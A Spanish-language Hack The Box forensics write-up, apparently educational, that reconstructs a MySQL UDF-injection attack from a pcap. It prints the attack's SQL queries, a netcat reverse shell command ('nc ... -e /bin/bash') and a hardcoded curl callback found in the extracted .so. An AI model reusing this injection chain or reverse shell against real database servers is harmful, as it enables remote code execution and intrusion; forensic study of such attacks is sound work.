---
title: "Endpoint"
description: "Writeup de Endpoint - Hack The Box - Forensics 200pts. pcap con tráfico MySQL puro; el atacante usa UDF injection insertando chunks base64 de un ELF .so para crear una función do_system y ejecutar reverse shell; el binario contiene la flag codificada en base64."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - pcap
  - tshark
  - mysql
  - udf
  - base64
  - elf
  - strings
---

# Endpoint

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

Un ZIP protegido con contraseña contiene un `capture.pcap` (757 paquetes, tráfico MySQL puro entre `10.10.0.3` y `10.10.0.2:3306`). Hay que reconstruir el ataque MySQL UDF y recuperar la flag embebida en el binario malicioso.

---

## Reconocimiento del pcap

```bash
tshark -r capture.pcap -q -z io,phs
```

```text
frame     frames:757 bytes:84945
  eth → ip → tcp → mysql    frames:662 bytes:78659
```

Todo el tráfico es MySQL. Dos hosts: cliente `10.10.0.3` y servidor MySQL `10.10.0.2:3306`.

---

## Extracción de queries MySQL

```bash
tshark -r capture.pcap -Y "mysql.query" -T fields -e mysql.query
```

```text
SELECT DATABASE()
DROP TABLE IF EXISTS xQGgYA
CREATE TABLE xQGgYA (qza varchar(255) NOT NULL)
INSERT INTO xQGgYA VALUES ('f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAAFgxAAAA')
INSERT INTO xQGgYA VALUES ('AAAAAAAAAEAAOAALAEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
[... cientos de INSERTs con datos base64 ...]
SELECT FROM_BASE64(GROUP_CONCAT(qza SEPARATOR '')) FROM xQGgYA INTO DUMPFILE '/usr/lib/mysql/plugin/lvg6H1g.so'
DROP FUNCTION IF EXISTS do_system
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'lvg6H1g.so'
SELECT do_system('nc 10.10.0.99 8080 -e /bin/bash')
```

**Técnica UDF (User-Defined Function):**
1. Crear tabla temporal `xQGgYA`.
2. Insertar chunks base64 del ELF malicioso.
3. Reconstruir el binario con `FROM_BASE64(GROUP_CONCAT(...))` y volcarlo directamente al directorio de plugins de MySQL.
4. Crear la función `do_system` desde el `.so`.
5. Ejecutar `nc` para reverse shell.

---

## Reconstrucción del binario

```bash
tshark -r capture.pcap -Y "mysql.query" -T fields -e mysql.query \
  | grep "INSERT INTO xQGgYA VALUES" \
  | sed "s/INSERT INTO xQGgYA VALUES ('\(.*\)')/\1/" > encoded_chunks.txt

python3 << 'EOF'
import base64
with open('encoded_chunks.txt', 'r') as f:
    chunks = f.readlines()
b64_data = ''.join([c.strip() for c in chunks])
binary_data = base64.b64decode(b64_data)
with open('lvg6H1g.so', 'wb') as f:
    f.write(binary_data)
print(f"Binario extraído: {len(binary_data)} bytes")
EOF
```

```text
Binario extraído: 14424 bytes
```

---

## Análisis del binario extraído

```bash
file lvg6H1g.so
```

```text
lvg6H1g.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
```

```bash
strings lvg6H1g.so | grep -E "curl|http|callback"
```

```text
remote_callback
curl -s https://files.pypi-install.com/packages/callback/SFRCe2NodW5rNV80bmRfdWRmX2Ywcl9icjM0a2Y0NTd9
```

El binario contiene un comando `curl` hardcodeado que descarga desde una URL cuyo path final es la flag codificada en base64.

---

## Decodificar la flag

```bash
echo "SFRCe2NodW5rNV80bmRfdWRmX2Ywcl9icjM0a2Y0NTd9" | base64 -d
```

```text
HTB{FLAG}
```

---

## Cadena de Ataque

```text
1. Sesión MySQL entre 10.10.0.3 y 10.10.0.2:3306
       ↓
2. CREATE TABLE + INSERT × N → chunks base64 del ELF
       ↓
3. FROM_BASE64(GROUP_CONCAT(...)) INTO DUMPFILE → lvg6H1g.so en plugin dir
       ↓
4. CREATE FUNCTION do_system SONAME 'lvg6H1g.so'
       ↓
5. do_system('nc 10.10.0.99 8080 -e /bin/bash') → reverse shell
       ↓
6. strings lvg6H1g.so → URL con base64 → flag
```

---

## Lecciones Aprendidas

- **MySQL UDF injection**: con privilegios `FILE` en MySQL se puede volcar datos a cualquier ruta accesible por el proceso MySQL. Limitar el privilegio `FILE` y asegurar que el directorio de plugins no sea escribible por usuarios de BD sin privilegios de SO.
- **Binarios maliciosos en tráfico de red**: el `.so` completo fue transferido a través de queries SQL, eludiendo controles de nivel de red que no inspeccionan capa de aplicación MySQL.
- **Análisis de strings en binarios**: `strings` en un `.so` stripped puede revelar URLs, comandos hardcodeados y otras constantes de alto valor forense.

---

## Referencias

- [MySQL UDF Exploitation](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#mysql-udf-exploitation)
- [tshark — MySQL dissector](https://www.wireshark.org/docs/dfref/m/mysql.html)
